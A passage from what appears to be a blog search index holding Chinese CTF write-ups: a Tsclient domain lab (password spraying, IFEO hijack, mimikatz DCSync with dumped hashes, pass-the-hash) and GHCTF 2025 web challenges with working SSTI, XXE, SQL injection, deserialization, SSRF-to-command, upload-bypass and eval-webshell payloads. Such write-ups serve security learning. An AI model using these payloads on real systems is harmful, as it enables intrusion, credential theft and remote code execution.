这里有一串账号密码，用这串账号密码进行一个密码喷洒\ncrackmapexec -q smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Z!# ┌──(root㉿Xrntkk-Laptop)-[/home/xrntkk]\r└─# proxychains4 -q crackmapexec smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Zproxychains4 crackmapexec smb 172.22.8.0/24\r-u Aldrich -p Ald@rLMWuy7Z\rSMB 172.22.8.18 445 WIN-WEB [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)\rSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.46 445 WIN2016 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)\rSMB 172.22.8.18 445 WIN-WEB [-] WIN-WEB\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.31 445 WIN19-CLIENT [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE 可以看到这三台机貌似都能登上去\nSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False) 我这里选择登31\nproxychains4 rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p \u0026#39;Ald@rLMWuy7Z!#\u0026#39; 这里要用rdesktop登，rdp登不上\n会提示密码过期，改个密码就行了\n但是改完密码这台机还是登不上，没有登陆权限\n所以我们尝试用这个修改后的账号密码再去登这个账号的另一台机子\n成功在46中登入，后面还是用rdp吧，rdesktop也太卡了\nxiaorang.lab\\Aldrich\rAbc123456 FLAG2 信息收集一下\n可以看到我们已经拿下域内的一台机子了\nsysteminfo 接着我们用bloodhound来进行一下域内信息收集\nSharpHound.exe -c all 将数据采集完生成的zip文件，上传导入到BloodHound分析\n从图中，我们会发现46这台机子的用户是域管，那我们接下来就要想办法在这台机子上提权，然后拿下域控\n根据前面的hint\nDo you know how to hijack Image? 我们可以知道接下来要进行镜像劫持(IFEO)提权\nGet-ACL -Path \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\u0026#34; | fl 这条命令的意思是获取指定注册表路径的访问控制列表（ACL）。\nNT AUTHORITY\\Authenticated Users 我们可以发现全部已登录用户都可以对注册表进行修改\n那我们就可以通过修改注册表进行映像劫持\n我们这里通过将放大镜启动的magnify.exe替换成C:\\windows\\system32\\cmd.exe，来进行提权\n1REG ADD \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\u0026#34; /v Debugger /t REG_SZ /d \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; 修改后选择锁定\n在锁定页面选择放大镜即可\ntype c:\\Users\\Administrator\\flag\\flag02.txt 接着我们可以新建一个用户让rdp可以连上去\nFLAG3 接下来就是常规的将域内用户的哈希dump下来\nmimikatz.exe \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit \u0026gt; mimikatz.txt 结果\n.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\r.## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo)\r## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\r## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz\r\u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com )\r\u0026#39;#####\u0026#39; \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/\rmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\r[DC] \u0026#39;xiaorang.lab\u0026#39; will be the domain\r[DC] \u0026#39;DC01.xiaorang.lab\u0026#39; will be the DC server\r[DC] Exporting domain \u0026#39;xiaorang.lab\u0026#39;\r[rpc] Service : ldap\r[rpc] AuthnSvc : GSS_NEGOTIATE (9)\r502\tkrbtgt\t3ffd5b58b4a6328659a606c3ea6f9b63\t514\r1000\tDC01$\t7408967f1fd3c2ff807232b7b5c5fc95\t532480\r500\tAdministrator\t2c9d81bdcf3ec8b1def10328a7cc2f08\t512\r1103\tWIN2016$\taae3dca76f254c52708ee076935bb533\t16781312\r1104\tWIN19-CLIENT$\t7c011200ecbe666945e465c200afcb5e\t16781312\r1105\tAldrich\t0607f770c2f37e09a850e09e920a9f45\t512\rmimikatz(commandline) # exit\rBye! 之后就可以进行横向移动了\nproxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk type c:\\users\\administrator\\flag\\flag03.txt 拿到最后一个flag\nC:\\Windows\\system32\u0026gt;type c:\\users\\administrator\\flag\\flag03.txt\r_________ __ _ _\r| _ _ | [ | (_) / |_\r|_/ | | \\_|.--. .---. | | __ .---. _ .--. `| |-\u0026#39;\r| | ( (`\\] / /\u0026#39;`\\] | | [ |/ /__\\\\[ `.-. | | |\r_| |_ `\u0026#39;.\u0026#39;. | \\__. | | | || \\__., | | | | | |,\r|_____| [\\__) )\u0026#39;.___.\u0026#39;[___][___]\u0026#39;.__.\u0026#39;[___||__]\\__/\rCongratulations! ! !\rflag03: flag{410202d3-2e47-4619-a6b0-96051a985f2e} 这题用cs打会方便很多，但是一开始没考虑到，所以后面也一直没用。\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/","summary":"\u003cp\u003eTsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。\u003c/p\u003e","title":"春秋云镜-Tsclient-Writeup"},{"content":"战队名：我要打奥斯汀major\n比赛排名：5\nWeb upload?SSTI! 读取文件中的内容并进行模板渲染，存在ssti\n有waf\n1def contains_dangerous_keywords(file_path): 2 dangerous_keywords = [\u0026#39;_\u0026#39;, \u0026#39;os\u0026#39;, \u0026#39;subclasses\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;__globals__\u0026#39;,\u0026#39;flag\u0026#39;,] 3 4 with open(file_path, \u0026#39;rb\u0026#39;) as f: 5 file_content = str(f.read()) 6 7 for keyword in dangerous_keywords: 8 if keyword in file_content: 9 return True # 找到危险关键字，返回 True 简单绕一下\npayload:\n1{{\u0026#34;\u0026#34;[\u0026#39;\\x5f\\x5fclass\\x5f\\x5f\u0026#39;][\u0026#39;\\x5f\\x5fbase\\x5f\\x5f\u0026#39;][\u0026#39;\\x5f\\x5fsubcl\u0026#39;+\u0026#39;asses\\x5f\\x5f\u0026#39;]()[139][\u0026#39;\\x5f\\x5finit\\x5f\\x5f\u0026#39;][\u0026#39;\\x5f\\x5fglo\u0026#39;+\u0026#39;bals\\x5f\\x5f\u0026#39;][\u0026#39;\\x5f\\x5fbui\u0026#39;+\u0026#39;ltins\\x5f\\x5f\u0026#39;][\u0026#39;\\x5f\\x5fimport\\x5f\\x5f\u0026#39;](\u0026#39;OS\u0026#39;.lower()).popen(\u0026#39;cat /f*\u0026#39;).read()}} 随便传个txt就行\n(\u0026gt;﹏\u0026lt;) 题目\n1from flask import Flask,request import base64 from lxml import etree import re app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def index(): return open(__file__).read() @app.route(\u0026#39;/ghctf\u0026#39;,methods=[\u0026#39;POST\u0026#39;]) def parse(): xml=request.form.get(\u0026#39;xml\u0026#39;) print(xml) if xml is None: return \u0026#34;No System is Safe.\u0026#34; parser = etree.XMLParser(load_dtd=True, resolve_entities=True) root = etree.fromstring(xml, parser) name=root.find(\u0026#39;name\u0026#39;).text return name or None if __name__==\u0026#34;__main__\u0026#34;: app.run(host=\u0026#39;0.0.0.0\u0026#39;,port=8080) 是个xxe\n直接读flag\n1curl -X POST http://node2.anna.nssctf.cn:28535/ghctf --data-urlencode \u0026#39;\u0026lt;!DOCTYPE data [\u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///flag\u0026#34; \u0026gt; ]\u0026gt;\u0026lt;root\u0026gt;\u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt;\u0026lt;/root\u0026gt;\u0026#39; SQL??? 1url/?id=1 union select 1,2,3,4,sqlite_version() 发现是Sqlite\n接着查表就行了\n1url/?id=1 union select 1,2,3,4,sql from sqlite_master 1?id=1 union select 1,2,3,4,select flag from flag 2//直接从flag表中查flag列就行 Popppppp 题目\n1\u0026lt;?php 2error_reporting(0); 3 4class CherryBlossom { 5 public $fruit1; 6 public $fruit2; 7 8 public function __construct($a) { 9 $this-\u0026gt;fruit1 = $a; 10 } 11 12 function __destruct() { 13 echo $this-\u0026gt;fruit1; 14 } 15 16 public function __toString() { 17 $newFunc = $this-\u0026gt;fruit2; 18 return $newFunc(); 19 } 20} 21 22class Forbidden { 23 private $fruit3; 24 25 public function __construct($string) { 26 $this-\u0026gt;fruit3 = $string; 27 } 28 29 public function __get($name) { 30 $var = $this-\u0026gt;$name; 31 $var[$name](); 32 } 33} 34 35class Warlord { 36 public $fruit4; 37 public $fruit5; 38 public $arg1; 39 40 public function __call($arg1, $arg2) { 41 $function = $this-\u0026gt;fruit4; 42 return $function(); 43 } 44 45 public function __get($arg1) { 46 $this-\u0026gt;fruit5-\u0026gt;ll2(\u0026#39;b2\u0026#39;); 47 } 48} 49 50class Samurai { 51 public $fruit6; 52 public $fruit7; 53 54 public function __toString() { 55 $long = @$this-\u0026gt;fruit6-\u0026gt;add(); 56 return $long; 57 } 58 59 public function __set($arg1, $arg2) { 60 if ($this-\u0026gt;fruit7-\u0026gt;tt2) { 61 echo \u0026#34;xxx are the best!!!\u0026#34;; 62 } 63 } 64} 65 66class Mystery { 67 68 public function __get($arg1) { 69 array_walk($this, function ($day1, $day2) { 70 $day3 = new $day2($day1); 71 foreach ($day3 as $day4) { 72 echo ($day4 . \u0026#39;\u0026lt;br\u0026gt;\u0026#39;); 73 } 74 }); 75 } 76} 77 78class Princess { 79 protected $fruit9; 80 81 protected function addMe() { 82 return \u0026#34;The time spent with xxx is my happiest time\u0026#34; . $this-\u0026gt;fruit9; 83 } 84 85 public function __call($func, $args) { 86 call_user_func([$this, $func . \u0026#34;Me\u0026#34;], $args); 87 } 88} 89 90class Philosopher { 91 public $fruit10; 92 public $fruit11=\u0026#34;sr22kaDugamdwTPhG5zU\u0026#34;; 93 94 public function __invoke() { 95 if (md5(md5($this-\u0026gt;fruit11)) == 666) { 96 return $this-\u0026gt;fruit10-\u0026gt;hey; 97 } 98 } 99} 100 101class UselessTwo { 102 public $hiddenVar = \u0026#34;123123\u0026#34;; 103 104 public function __construct($value) { 105 $this-\u0026gt;hiddenVar = $value; 106 } 107 108 public function __toString() { 109 return $this-\u0026gt;hiddenVar; 110 } 111} 112 113class Warrior { 114 public $fruit12; 115 private $fruit13; 116 117 public function __set($name, $value) { 118 $this-\u0026gt;$name = $value; 119 if ($this-\u0026gt;fruit13 == \u0026#34;xxx\u0026#34;) { 120 strtolower($this-\u0026gt;fruit12); 121 } 122 } 123} 124 125class UselessThree { 126 public $dummyVar; 127 128 public function __call($name, $args) { 129 return $name; 130 } 131} 132 133class UselessFour { 134 public $lalala; 135 136 public function __destruct() { 137 echo \u0026#34;Hehe\u0026#34;; 138 } 139} 140 141if (isset($_GET[\u0026#39;GHCTF\u0026#39;])) { 142 unserialize($_GET[\u0026#39;GHCTF\u0026#39;]); 143} else { 144 highlight_file(__FILE__); 145} 146 147?\u0026gt; 跟去年ghctf的题目几乎一样\nhttps://blog.csdn.net/liaochonxiang/article/details/140361138\n走到Mystery类之后利用原生类读文件\nPOC\n1import hashlib 2import itertools 3import string 4 5for i in itertools.product(string.printable, repeat=3): 6 s = \u0026#39;\u0026#39;.join(i) 7 s1 = hashlib.md5(s.encode()).hexdigest() 8 s2 = hashlib.md5(s1.encode()).hexdigest() 9 if s2[:3] == \u0026#39;666\u0026#39;: 10 print(s) 11\u0026lt;?php 12class CherryBlossom{ 13 public $fruit1; 14 public $fruit2; 15} 16class Philosopher { 17 public $fruit10; 18 public $fruit11; 19} 20class Mystery{ 21 public $mystery; 22} 23$s = new CherryBlossom; 24$s-\u0026gt;fruit1 = new CherryBlossom; 25$s-\u0026gt;fruit1-\u0026gt;fruit2 = new Philosopher; 26$s-\u0026gt;fruit1-\u0026gt;fruit2-\u0026gt;fruit11 = \u0026#39;Okg\u0026#39;; 27$s-\u0026gt;fruit1-\u0026gt;fruit2-\u0026gt;fruit10 = new Mystery; 28 29# $s-\u0026gt;fruit1-\u0026gt;fruit2-\u0026gt;fruit10-\u0026gt;FilesystemIterator=\u0026#39;/\u0026#39;; 30$s-\u0026gt;fruit1-\u0026gt;fruit2-\u0026gt;fruit10-\u0026gt;SplFileObject=\u0026#39;/flag44545615441084\u0026#39;; 31 32echo serialize($s); 33?\u0026gt; ez_readfile 题目\n1\u0026lt;?php 2 show_source(__FILE__); 3 if (md5($_POST[\u0026#39;a\u0026#39;]) === md5($_POST[\u0026#39;b\u0026#39;])) { 4 if ($_POST[\u0026#39;a\u0026#39;] != $_POST[\u0026#39;b\u0026#39;]) { 5 if (is_string($_POST[\u0026#39;a\u0026#39;]) \u0026amp;\u0026amp; is_string($_POST[\u0026#39;b\u0026#39;])) { 6 echo file_get_contents($_GET[\u0026#39;file\u0026#39;]); 7 } 8 } 9 } 10?\u0026gt; md5强碰撞，我随便找了一对\n1M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2 2 3与 4 5M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 接下来的文件包含因为不知道flag名没办法直接读，很自然就能想到cnext\nhttps://github.com/kezibei/php-filter-iconv\n我用的这个工具打，感觉比原版好用\n利用任意文件读取读maps和libc二进制文件，libc的路径在maps里面有\n拿到文件之后直接生成payload打就行了\nezzzz_pickle 弱口令登录\nadmin/admin123\n登进去之后发现有个任意文件读取\n我这里直接打的非预期\n直接读环境变量 /proc/1/environ，就能拿到flag\n预期解应该是读源码然后读环境变量拿key和iv打pickle的\nPayload:\n1POST filename=/proc/1/environ Goph3rrr /app.py可以拿到源码\n1@app.route(\u0026#39;/Manage\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 2def cmd(): 3 if request.remote_addr != \u0026#34;127.0.0.1\u0026#34;: 4 return \u0026#34;Forbidden!!!\u0026#34; 5 if request.method == \u0026#34;GET\u0026#34;: 6 return \u0026#34;Allowed!!!\u0026#34; 7 if request.method == \u0026#34;POST\u0026#34;: 8 return os.popen(request.form.get(\u0026#34;cmd\u0026#34;)).read() 9 10@app.route(\u0026#39;/Gopher\u0026#39;) 11def visit(): 12 url = request.args.get(\u0026#39;url\u0026#39;) 13 if url is None: 14 return \u0026#34;No url provided :)\u0026#34; 15 url = urlparse(url) 16 realIpAddress = socket.gethostbyname(url.hostname) 17 if url.scheme == \u0026#34;file\u0026#34; or realIpAddress in BlackList: 18 return \u0026#34;No (≧∇≦)\u0026#34; 19 result = subprocess.run([\u0026#34;curl\u0026#34;, \u0026#34;-L\u0026#34;, urlunparse(url)], capture_output=True, text=True) 20 return result.stdout 主要是这两个路由，一个要本地访问，另一个可以打ssrf\n其实这题就是0xgame2024的一道ssrf，几乎没改\npayload拿来改一下直接打就行了\npayload如下\n1/Gopher?url=gopher://0.0.0.0:8000/_payload 2POST /Manage HTTP/1.1 3Host: 127.0.0.1:8000 4Content-Type: application/x-www-form-urlencoded 5Content-Length: 7 6 7cmd=env 把上面这个url编码两次之后放到payload那里\n最终payload\n1/Gopher?url=gopher://0.0.0.0:8000/_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%34%64%25%36%31%25%36%65%25%36%31%25%36%37%25%36%35%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%33%61%25%33%38%25%33%30%25%33%30%25%33%30%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%37%25%30%61%25%30%61%25%36%33%25%36%64%25%36%34%25%33%64%25%36%35%25%36%65%25%37%36 环境变量里面有flag\nUPUPUP 文件上传，fuzz了一下，感觉php是没什么可能绕过的了\n想到打.htaccess\n但是应该有exif_imagetype()，正常来说用GIF89a绕过.htaccess会报错\n可以通过这个方法绕一下\nPayload\n1#define width 66 2#define height 66 3\u0026lt;FilesMatch \u0026#34;1.jpg\u0026#34;\u0026gt; 4 SetHandler application/x-httpd-php 5\u0026lt;/FilesMatch\u0026gt; Message in a Bottle bottle的模板注入\n这题waf掉了{}\nhttps://github.com/myzhan/bottle-doc-zh-cn/blob/master/docs/stpl.rst\n看了一下文档，发现其实不用{}\nPayload\n1\u0026lt;h\u0026gt; 2 %import os;os.system(\u0026#39;whoami\u0026#39;) 3 %end 4\u0026lt;/h\u0026gt; 题目没回显但是出网，我这里直接反弹shell读flag了\nEscape！ 漏洞点\n1$userData = checkSignedCookie(); 2if ($userData) { 3 #echo $userData; 4 $user=unserialize($userData); 5 #var_dump($user); 6 if($user-\u0026gt;isadmin){ 7 $tmp=file_get_contents(\u0026#34;tmp/admin.html\u0026#34;); 8 9 echo $tmp; 10 11 if($_POST[\u0026#39;txt\u0026#39;]) { 12 $content = \u0026#39;\u0026lt;?php exit; ?\u0026gt;\u0026#39;; 13 $content .= $_POST[\u0026#39;txt\u0026#39;]; 14 file_put_contents($_POST[\u0026#39;filename\u0026#39;], $content); 15 } 16 } 17 else{ 18 $tmp=file_get_contents(\u0026#34;tmp/admin.html\u0026#34;); 19 echo $tmp; 20 if($_POST[\u0026#39;txt\u0026#39;]||$_POST[\u0026#39;filename\u0026#39;]){ 21 echo \u0026#34;\u0026lt;h1\u0026gt;权限不足，写入失败\u0026lt;h1\u0026gt;\u0026#34;; 22} 经典的死亡杂糅绕过\n但是前提是要isadmin为1\n看到反序列化，再加上题目暗示与waf有关，自然就想到了反序列化字符串逃逸\nWaf\n1\u0026lt;?php 2 3function waf($c) 4{ 5 $lists=[\u0026#34;flag\u0026#34;,\u0026#34;\u0026#39;\u0026#34;,\u0026#34;\\\\\u0026#34;,\u0026#34;sleep\u0026#34;,\u0026#34;and\u0026#34;,\u0026#34;||\u0026#34;,\u0026#34;\u0026amp;\u0026amp;\u0026#34;,\u0026#34;select\u0026#34;,\u0026#34;union\u0026#34;]; 6 foreach($lists as $list){ 7 $c=str_replace($list,\u0026#34;error\u0026#34;,$c); 8 } 9 #echo $c; 10 return $c; 11} 我这里是先随便注册一个账号，然后拿到cookie之后解base64拿到序列化后的数据\n1function setSignedCookie($serializedData, $cookieName = \u0026#39;user_token\u0026#39;, $secretKey = \u0026#39;fake_secretKey\u0026#39;) { 2 $signature = hash_hmac(\u0026#39;sha256\u0026#39;, $serializedData, $secretKey); 3 4 $token = base64_encode($serializedData . \u0026#39;|\u0026#39; . $signature); 5 6 setcookie($cookieName, $token, time() + 3600, \u0026#34;/\u0026#34;); // 设置有效期为1小时 7} 可以看到序列化的数据是直接进行base64编码的\n构造出payload\n1username flagandandandandandandandandandand\u0026#34;;s:7:\u0026#34;isadmin\u0026#34;;b:1;} 2password 123456 //随意 逃逸21个字符\n登录之后写马就行，但是要绕一下死亡杂糅\nhttps://xz.aliyun.com/news/7758\npayload\n1php://filter/convert.base64-decode/resource=1.php 2aPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg== 3//要补一个a 4//\u0026lt;?php @eval($_POST[1]);?\u0026gt; GetShell 题目\n1\u0026lt;?php 2highlight_file(__FILE__); 3 4class ConfigLoader { 5 private $config; 6 7 public function __construct() { 8 $this-\u0026gt;config = [ 9 \u0026#39;debug\u0026#39; =\u0026gt; true, 10 \u0026#39;mode\u0026#39; =\u0026gt; \u0026#39;production\u0026#39;, 11 \u0026#39;log_level\u0026#39; =\u0026gt; \u0026#39;info\u0026#39;, 12 \u0026#39;max_input_length\u0026#39; =\u0026gt; 100, 13 \u0026#39;min_password_length\u0026#39; =\u0026gt; 8, 14 \u0026#39;allowed_actions\u0026#39; =\u0026gt; [\u0026#39;run\u0026#39;, \u0026#39;debug\u0026#39;, \u0026#39;generate\u0026#39;] 15 ]; 16 } 17 18 public function get($key) { 19 return $this-\u0026gt;config[$key] ?? null; 20 } 21} 22 23class Logger { 24 private $logLevel; 25 26 public function __construct($logLevel) { 27 $this-\u0026gt;logLevel = $logLevel; 28 } 29 30 public function log($message, $level = \u0026#39;info\u0026#39;) { 31 if ($level === $this-\u0026gt;logLevel) { 32 echo \u0026#34;[LOG] $message\\n\u0026#34;; 33 } 34 } 35} 36 37class UserManager { 38 private $users = []; 39 private $logger; 40 41 public function __construct($logger) { 42 $this-\u0026gt;logger = $logger; 43 } 44 45 public function addUser($username, $password) { 46 if (strlen($username) \u0026lt; 5) { 47 return \u0026#34;Username must be at least 5 characters\u0026#34;; 48 } 49 50 if (strlen($password) \u0026lt; 8) { 51 return \u0026#34;Password must be at least 8 characters\u0026#34;; 52 } 53 54 $this-\u0026gt;users[$username] = password_hash($password, PASSWORD_BCRYPT); 55 $this-\u0026gt;logger-\u0026gt;log(\u0026#34;User $username added\u0026#34;); 56 return \u0026#34;User $username added\u0026#34;; 57 } 58 59 public function authenticate($username, $password) { 60 if (isset($this-\u0026gt;users[$username]) \u0026amp;\u0026amp; password_verify($password, $this-\u0026gt;users[$username])) { 61 $this-\u0026gt;logger-\u0026gt;log(\u0026#34;User $username authenticated\u0026#34;); 62 return \u0026#34;User $username authenticated\u0026#34;; 63 } 64 return \u0026#34;Authentication failed\u0026#34;; 65 } 66} 67 68class StringUtils { 69 public static function sanitize($input) { 70 return htmlspecialchars($input, ENT_QUOTES, \u0026#39;UTF-8\u0026#39;); 71 } 72 73 public static function generateRandomString($length = 10) { 74 return substr(str_shuffle(str_repeat($x = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;, ceil($length / strlen($x)))), 1, $length); 75 } 76} 77 78class InputValidator { 79 private $maxLength; 80 81 public function __construct($maxLength) { 82 $this-\u0026gt;maxLength = $maxLength; 83 } 84 85 public function validate($input) { 86 if (strlen($input) \u0026gt; $this-\u0026gt;maxLength) { 87 return \u0026#34;Input exceeds maximum length of {$this-\u0026gt;maxLength} characters\u0026#34;; 88 } 89 return true; 90 } 91} 92 93class CommandExecutor { 94 private $logger; 95 96 public function __construct($logger) { 97 $this-\u0026gt;logger = $logger; 98 } 99 100 public function execute($input) { 101 if (strpos($input, \u0026#39; \u0026#39;) !== false) { 102 $this-\u0026gt;logger-\u0026gt;log(\u0026#34;Invalid input: space detected\u0026#34;); 103 die(\u0026#39;No spaces allowed\u0026#39;); 104 } 105 106 @exec($input, $output); 107 $this-\u0026gt;logger-\u0026gt;log(\u0026#34;Result: $input\u0026#34;); 108 return implode(\u0026#34;\\n\u0026#34;, $output); 109 } 110} 111 112class ActionHandler { 113 private $config; 114 private $logger; 115 private $executor; 116 117 public function __construct($config, $logger) { 118 $this-\u0026gt;config = $config; 119 $this-\u0026gt;logger = $logger; 120 $this-\u0026gt;executor = new CommandExecutor($logger); 121 } 122 123 public function handle($action, $input) { 124 if (!in_array($action, $this-\u0026gt;config-\u0026gt;get(\u0026#39;allowed_actions\u0026#39;))) { 125 return \u0026#34;Invalid action\u0026#34;; 126 } 127 128 if ($action === \u0026#39;run\u0026#39;) { 129 $validator = new InputValidator($this-\u0026gt;config-\u0026gt;get(\u0026#39;max_input_length\u0026#39;)); 130 $validationResult = $validator-\u0026gt;validate($input); 131 if ($validationResult !== true) { 132 return $validationResult; 133 } 134 135 return $this-\u0026gt;executor-\u0026gt;execute($input); 136 } elseif ($action === \u0026#39;debug\u0026#39;) { 137 return \u0026#34;Debug mode enabled\u0026#34;; 138 } elseif ($action === \u0026#39;generate\u0026#39;) { 139 return \u0026#34;Random string: \u0026#34; . StringUtils::generateRandomString(15); 140 } 141 142 return \u0026#34;Unknown action\u0026#34;; 143 } 144} 145 146if (isset($_REQUEST[\u0026#39;action\u0026#39;])) { 147 $config = new ConfigLoader(); 148 $logger = new Logger($config-\u0026gt;get(\u0026#39;log_level\u0026#39;)); 149 150 $actionHandler = new ActionHandler($config, $logger); 151 $input = $_REQUEST[\u0026#39;input\u0026#39;] ?? \u0026#39;\u0026#39;; 152 echo $actionHandler-\u0026gt;handle($_REQUEST[\u0026#39;action\u0026#39;], $input); 153} else { 154 $config = new ConfigLoader(); 155 $logger = new Logger($config-\u0026gt;get(\u0026#39;log_level\u0026#39;)); 156 $userManager = new UserManager($logger); 157 158 if (isset($_POST[\u0026#39;register\u0026#39;])) { 159 $username = $_POST[\u0026#39;username\u0026#39;]; 160 $password = $_POST[\u0026#39;password\u0026#39;]; 161 162 echo $userManager-\u0026gt;addUser($username, $password); 163 } 164 165 if (isset($_POST[\u0026#39;login\u0026#39;])) { 166 $username = $_POST[\u0026#39;username\u0026#39;]; 167 $password = $_POST[\u0026#39;password\u0026#39;]; 168 169 echo $userManager-\u0026gt;authenticate($username, $password); 170 } 171 172 $logger-\u0026gt;log(\u0026#34;No action provided, running default logic\u0026#34;); 173} 审计一下\n1class CommandExecutor { 2 private $logger; 3 4 public function __construct($logger) { 5 $this-\u0026gt;logger = $logger; 6 } 7 8 public function execute($input) { 9 if (strpos($input, \u0026#39; \u0026#39;) !== false) { 10 $this-\u0026gt;logger-\u0026gt;log(\u0026#34;Invalid input: space detected\u0026#34;); 11 die(\u0026#39;No spaces allowed\u0026#39;); 12 } 13 14 @exec($input, $output); 15 $this-\u0026gt;logger-\u0026gt;log(\u0026#34;Result: $input\u0026#34;); 16 return implode(\u0026#34;\\n\u0026#34;, $output); 17 } 18} 有个执行类\n当传参Action为run的时候就能走进去了\n传参input进行命令执行，waf了空格\n尝试读flag发现读不了，要提权\n尝试suid提权\n1find / -perm -u=s -type f 2\u0026gt;/dev/null 2看到有wc，而且wc可以读文件 3 4./wc --files0-from \u0026#34;/flag\u0026#34; Message in a Bottle plus bottle注入的plus版\nhint:增加了一点waf和Python语法错误检测，题目不出网\n一开始试了很久发现一直说语法错误\n后面想了想发现这个语法进行Python语法错误检测确实是会报错的\n那我们用多行注释掉不就好了，因为题目不出网，打内存马\n参考\nhttps://xz.aliyun.com/news/17049\nPayload\n1\u0026#34;\u0026#34;\u0026#34; 2% __import__(\u0026#39;sys\u0026#39;).modules[\u0026#39;__main__\u0026#39;].app.route(\u0026#34;/c\u0026#34;,\u0026#34;GET\u0026#34;,lambda :__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read()) 3% end 4\u0026#34;\u0026#34;\u0026#34; 访问/c拿回显\n","permalink":"http://localhost:1313/post/ghctf_2025/","summary":"\u003cp\u003e战队名：\u003cstrong\u003e我要打奥斯汀major\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e比赛排名：5\u003c/p\u003e\n\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"uploadssti\"\u003eupload?SSTI!\u003c/h3\u003e\n\u003cp\u003e读取文件中的内容并进行模板渲染，存在ssti\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"img\" loading=\"lazy\" src=\"../assets/1742122180769-6.png\"\u003e\u003c/p\u003e\n\u003cp\u003e有waf\u003c/p\u003e\n\u003cdiv 